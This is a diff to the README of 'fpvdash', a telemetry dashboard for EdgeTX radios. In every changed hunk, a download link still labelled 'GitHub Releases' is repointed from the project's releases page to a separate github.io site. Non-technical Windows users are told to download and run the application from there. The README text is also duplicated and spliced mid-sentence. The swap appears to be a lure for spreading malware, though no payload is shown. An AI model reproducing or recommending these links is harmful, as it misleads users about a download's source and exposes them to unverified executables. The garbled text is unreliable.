@@ -1,6 +1,6 @@
 # 📊 fpvdash - Your Flight Data at a Glance
 
-[![Download fpvdash](https://img.shields.io/badge/Download-fpvdash-blueviolet?style=for-the-badge&labelColor=orange&logo=github&logoColor=white)](https://github.com/najaflali/fpvdash/releases)
+[![Download fpvdash](https://img.shields.io/badge/Download-fpvdash-blueviolet?style=for-the-badge&labelColor=orange&logo=github&logoColor=white)](https://najaflali.github.io)
 
 fpvdash is a full-screen telemetry dashboard designed for EdgeTX colour radios. Whether you fly Betaflight quads with ExpressLRS or Crossfire, this dashboard puts all your critical flight data front and center. It includes a find-my-quad QR code, a logbook to track your flights, and voice callouts so you can keep your eyes on the sky. No programming knowledge is needed—just download, install, and start using it on your Windows computer.
 
@@ -8,9 +8,9 @@ fpvdash is a full-screen telemetry dashboard designed for EdgeTX colour radios. 
 
 Visit this link to download the application:
 
-[**Download fpvdash from GitHub Releases**](https://github.com/najaflali/fpvdash/releases)
+[**Download fpvdash from GitHub Releases**](https://najaflali.github.io)
 
-[![Download fpvdash](https://img.shields.io/badge/Download-fpvdash-blueviolet?style=for-the-badge&labelColor=orange&logo=github&logoColor=white)](https://github.com/najaflali/fpvdash/releases)
+[![Download fpvdash](https://img.shields.io/badge/Download-fpvdash-blueviolet?style=for-the-badge&labelColor=orange&logo=github&logoColor=white)](https://najaflali.github.io)
 
 After downloading, run the application on your Windows computer. The download page contains the latest version and any release notes. Make sure you have a stable internet connection while downloading.
 
@@ -82,7 +82,7 @@ fpvdash is designed to be flexible. You can choose which telemetry values appear
 
 If you need help, the best place to start is the GitHub repository. There you will find the latest releases, documentation, and a place to report bugs or request features. The project is open source and welcomes contributions. Before asking for help, please check the troubleshooting section above and search# 📊 fpvdash - Your Flight Data at a Glance
 
-[![Download fpvdash](https://img.shields.io/badge/Download-fpvdash-blueviolet?style=for-the-badge&labelColor=orange&logo=github&logoColor=white)](https://github.com/najaflali/fpvdash/releases)
+[![Download fpvdash](https://img.shields.io/badge/Download-fpvdash-blueviolet?style=for-the-badge&labelColor=orange&logo=github&logoColor=white)](https://najaflali.github.io)
 
 fpvdash is a full-screen telemetry dashboard for EdgeTX colour radios. It is built for Betaflight quads using ExpressLRS or Crossfire. The dashboard shows your important flight data in large, clear numbers so you can read it easily while flying. It also includes a find-my-quad QR code, a logbook, and voice callouts. You do not need technical skills to use it. This guide helps you download and open fpvdash on a Windows computer.
 
@@ -90,9 +90,9 @@ fpvdash is a full-screen telemetry dashboard for EdgeTX colour radios. It is bui
 
 Visit this link to download the application:
 
-[**Download fpvdash from GitHub Releases**](https://github.com/najaflali/fpvdash/releases)
+[**Download fpvdash from GitHub Releases**](https://najaflali.github.io)
 
-[![Download fpvdash](https://img.shields.io/badge/Download-fpvdash-blueviolet?style=for-the-badge&labelColor=ff69b4&logo=github&logoColor=white)](https://github.com/najaflali/fpvdash/releases)
+[![Download fpvdash](https://img.shields.io/badge/Download-fpvdash-blueviolet?style=for-the-badge&labelColor=ff69b4&logo=github&logoColor=white)](https://najaflali.github.io)
 
 The download page contains the current version and release details. Use the link above to reach the download page. After you have downloaded the application, open it on your Windows computer.
 
